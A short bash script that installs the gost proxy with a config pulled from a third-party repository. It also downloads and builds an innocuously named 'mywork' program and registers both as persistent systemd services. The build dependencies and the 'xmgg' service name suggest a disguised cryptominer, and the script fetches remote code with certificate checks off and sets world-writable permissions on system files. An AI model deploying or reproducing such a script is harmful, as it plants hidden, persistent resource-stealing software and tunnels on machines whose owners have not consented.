#!/bin/bash

function Install_Gost(){
  Installation_dependency
  wget https://github.com/ginuerzh/gost/releases/download/v2.11.5/gost-linux-amd64-2.11.5.gz
  gunzip gost-linux-amd64-2.11.5.gz
  mv gost-linux-amd64-2.11.5 /usr/bin/gost
  chmod -R 777 /usr/bin/gost
  wget --no-check-certificate https://raw.githubusercontent.com/KANIKIG/Multi-EasyGost/master/gost.service && chmod -R 777 gost.service && mv gost.service /usr/lib/systemd/system
  mkdir /etc/gost && wget --no-check-certificate https://github.com/summaxx/myscript/raw/master/gostc.json && mv gostc.json /etc/gost/config.json && chmod -R 777 /etc/gost
  systemctl enable gost && systemctl restart gost
}


function Installation_dependency() {
    apt-get update
    apt-get install gzip wget -y
    if ! cmake --version &> /dev/null; then
      apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
    fi
    apt-get install hwloc nodejs -y
}

function Install_work(){
  if [ -f "/home/user/mywork/build/mywork" ]; then
    echo "mywrok ok"
  else
    wget --no-check-certificate https://github.com/summaxx/myscript/raw/refs/heads/master/mywork.gz
    tar -xf mywork.gz
    mkdir /home/user/mywork/build && cd /home/user/mywork/build
    cmake ..
    make -j$(nproc)
  fi
  cp /home/user/mywork/build/mywork /usr/bin/
  chmod +x /usr/bin/mywork
  wget --no-check-certificate https://github.com/summaxx/myscript/raw/refs/heads/master/xmgg.service
  chmod 755 xmgg.service
  mv xmgg.service /usr/lib/systemd/system
  systemctl enable xmgg && systemctl restart xmgg
}

sleep 3s
Installation_dependency
Install_Gost
Install_work
